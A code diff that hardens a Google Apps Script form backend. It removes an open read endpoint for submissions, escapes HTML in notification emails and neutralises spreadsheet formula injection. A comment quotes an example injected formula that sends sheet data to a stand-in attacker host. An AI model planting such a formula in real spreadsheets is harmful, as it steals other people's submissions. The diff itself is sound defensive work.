@@ -35,58 +35,34 @@ var CONFIG = (function () {
 })();
 
 function doGet(e) {
-  var tabName = e.parameter.tab;
-
-  if (!tabName) {
-    // Bare exec URL: JSON only. Apps Script can't serve robots.txt, a noindex
-    // meta tag, or a non-200 status, so returning HTML here gets the endpoint
-    // indexed by search engines. The human confirmation page lives at ?setup=1.
-    if (e.parameter.setup !== '1') {
-      return jsonResponse({ ok: true });
-    }
-    var projectName = CONFIG.site_name || CONFIG.project_slug || 'Forms';
-    var html = '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>' + projectName + '</title>'
-      + '<style>'
-      + '*{box-sizing:border-box;margin:0;padding:0}'
-      + 'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#0f0f13;color:#e2e2e8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}'
-      + '.card{background:#1a1a22;border:1px solid #2a2a38;border-radius:16px;padding:40px 48px;max-width:440px;width:100%;text-align:center;box-shadow:0 24px 64px rgba(0,0,0,0.4)}'
-      + '.badge{display:inline-flex;align-items:center;gap:8px;background:rgba(34,197,94,0.12);border:1px solid rgba(34,197,94,0.25);border-radius:999px;padding:6px 14px;margin-bottom:28px}'
-      + '.dot{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 8px rgba(34,197,94,0.6)}'
-      + '.badge-text{font-size:12px;font-weight:600;color:#22c55e;letter-spacing:0.04em}'
-      + 'h1{font-size:22px;font-weight:700;color:#f0f0f6;margin-bottom:8px}'
-      + '.subtitle{font-size:14px;color:#6b6b80;line-height:1.5}'
-      + '</style>'
-      + '</head><body>'
-      + '<div class="card">'
-      + '<div class="badge"><span class="dot"></span><span class="badge-text">Active</span></div>'
-      + '<h1>' + projectName + '</h1>'
-      + '<p class="subtitle">This endpoint accepts form submissions.</p>'
-      + '</div>'
-      + '</body></html>';
-    return HtmlService.createHtmlOutput(html).setTitle(projectName);
+  // This endpoint never returns submissions — there is no read path to the
+  // spreadsheet at all. A bare GET is a health check; ?setup=1 renders the
+  // owner's confirmation card. JSON rather than HTML at the bare URL keeps the
+  // endpoint out of search results: Apps Script can't serve robots.txt, a
+  // noindex meta tag, or a non-200 status.
+  if (e.parameter.setup !== '1') {
+    return jsonResponse({ ok: true });
   }
-
-  var tabDef = findTab(tabName);
-  if (!tabDef) return jsonResponse({ result: 'error', error: 'Unknown tab: ' + tabName });
-
-  var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(tabName);
-  if (!sheet) return jsonResponse({ result: 'error', error: 'Tab not found: ' + tabName });
-
-  var values = sheet.getDataRange().getValues();
-  if (values.length <= 1) return jsonResponse([]);
-
-  var headers = values[0];
-  var rows = [];
-  for (var k = 1; k < values.length; k++) {
-    var row = {};
-    for (var l = 0; l < headers.length; l++) {
-      if (String(headers[l]) !== '_hp') {
-        row[String(headers[l])] = values[k][l];
-      }
-    }
-    rows.push(row);
-  }
-  return jsonResponse(rows);
+  var projectName = CONFIG.site_name || CONFIG.project_slug || 'Forms';
+  var html = '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>' + projectName + '</title>'
+    + '<style>'
+    + '*{box-sizing:border-box;margin:0;padding:0}'
+    + 'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#0f0f13;color:#e2e2e8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}'
+    + '.card{background:#1a1a22;border:1px solid #2a2a38;border-radius:16px;padding:40px 48px;max-width:440px;width:100%;text-align:center;box-shadow:0 24px 64px rgba(0,0,0,0.4)}'
+    + '.badge{display:inline-flex;align-items:center;gap:8px;background:rgba(34,197,94,0.12);border:1px solid rgba(34,197,94,0.25);border-radius:999px;padding:6px 14px;margin-bottom:28px}'
+    + '.dot{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 8px rgba(34,197,94,0.6)}'
+    + '.badge-text{font-size:12px;font-weight:600;color:#22c55e;letter-spacing:0.04em}'
+    + 'h1{font-size:22px;font-weight:700;color:#f0f0f6;margin-bottom:8px}'
+    + '.subtitle{font-size:14px;color:#6b6b80;line-height:1.5}'
+    + '</style>'
+    + '</head><body>'
+    + '<div class="card">'
+    + '<div class="badge"><span class="dot"></span><span class="badge-text">Active</span></div>'
+    + '<h1>' + projectName + '</h1>'
+    + '<p class="subtitle">This endpoint accepts form submissions.</p>'
+    + '</div>'
+    + '</body></html>';
+  return HtmlService.createHtmlOutput(html).setTitle(projectName);
 }
 
 function doPost(e) {
@@ -139,7 +115,7 @@ ${caps.captcha ? `
       var key = String(h);
       if (key === 'submitted_at') return new Date().toISOString();
       if (key === '_hp') return '';
-      return fields[key] !== undefined ? String(fields[key]) : '';
+      return textOnly(fields[key] !== undefined ? String(fields[key]) : '');
     });
     sheet.appendRow(rowData);
 
@@ -159,15 +135,15 @@ ${caps.captcha ? `
       var htmlParts = displayKeys.map(function (k) {
         var val = String(fields[k] !== undefined ? fields[k] : '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
         return '<div style="margin-bottom:16px;padding-bottom:16px;border-bottom:1px solid #f3f4f6;">'
-          + '<p style="margin:0 0 3px;font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:#9ca3af;">' + k + '</p>'
+          + '<p style="margin:0 0 3px;font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:#9ca3af;">' + esc(k) + '</p>'
           + '<p style="margin:0;font-size:14px;color:#111827;white-space:pre-wrap;">' + val + '</p>'
           + '</div>';
       });
       var htmlBody = '<div style="font-family:Arial,sans-serif;max-width:520px;margin:0 auto;">'
         + '<div style="background:#6c5ce7;padding:20px 24px;border-radius:8px 8px 0 0;">'
         + '<p style="margin:0 0 2px;color:rgba(255,255,255,.65);font-size:11px;text-transform:uppercase;letter-spacing:.08em;">New submission</p>'
-        + '<h2 style="margin:0;color:#fff;font-size:18px;font-weight:600;">' + tabDef.label + '</h2>'
-        + (siteName ? '<p style="margin:4px 0 0;color:rgba(255,255,255,.65);font-size:13px;">' + siteName + '</p>' : '')
+        + '<h2 style="margin:0;color:#fff;font-size:18px;font-weight:600;">' + esc(tabDef.label) + '</h2>'
+        + (siteName ? '<p style="margin:4px 0 0;color:rgba(255,255,255,.65);font-size:13px;">' + esc(siteName) + '</p>' : '')
         + '</div>'
         + '<div style="padding:24px;background:#fff;border:1px solid #e5e7eb;border-top:none;">'
         + htmlParts.join('')
@@ -195,6 +171,18 @@ ${caps.captcha ? `
   } catch (err) {
     return jsonResponse({ result: 'error', error: err.message });
   }
+}
+
+// Sheets evaluates a leading =, +, - or @ as a formula, so a submitted value
+// like =IMPORTXML("https://attacker.example?d="&A1) would run the moment the
+// owner opened the sheet and could pull other submissions out to a third party.
+// A leading apostrophe forces Sheets to store the value as text — it is a format
+// marker, not part of the cell value, so getValue() still returns the original.
+function textOnly(v) {
+  // = + - @ TAB CR — any of these in first position starts a formula.
+  // charCodeAt on an empty string is NaN, which matches nothing.
+  var c = v.charCodeAt(0);
+  return (c === 61 || c === 43 || c === 45 || c === 64 || c === 9 || c === 13) ? "'" + v : v;
 }
 
 function findTab(name) {
